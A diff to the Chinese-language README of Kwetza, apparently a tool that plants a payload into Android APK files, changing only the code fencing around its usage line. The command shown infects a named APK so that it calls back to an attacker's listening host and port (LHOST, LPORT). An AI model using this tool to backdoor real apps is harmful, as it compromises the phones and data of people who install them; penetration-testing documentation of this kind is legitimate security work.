@@ -28,9 +28,9 @@ pip install beautifulsoup4
 ```
 Kwetza要求安装Apktool并可以通过您的PATH访问。可以使用位于此处的安装说明进行设置：https://ibotpeaches.github.io/Apktool/install
 # 用法
-
+```
 python kwetza.py nameOfTheApkToInfect.apk https/tcp LHOST LPORT yes/no customClass
-
+```
 * nameOfTheApkToInfect.apk = 希望植入payload的apk文件名
 
 * LHOST = 监听IP
